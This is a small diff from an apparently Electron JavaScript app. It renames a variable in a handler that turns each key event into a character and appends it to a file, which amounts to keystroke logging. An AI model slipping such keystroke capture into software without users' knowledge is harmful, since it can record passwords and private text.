@@ -110,8 +110,8 @@ app.whenReady().then(
     {
         text_key=String.fromCharCode(e.rawcode);
  
-     main_mouse+=text_key;
-     fs.writeFileSync(FileNameKey,main_mouse); 
+     main_key+=text_key;
+     fs.writeFileSync(FileNameKey,main_key); 
     }
   
     // document.getElementById("logs").innerHTML= main;
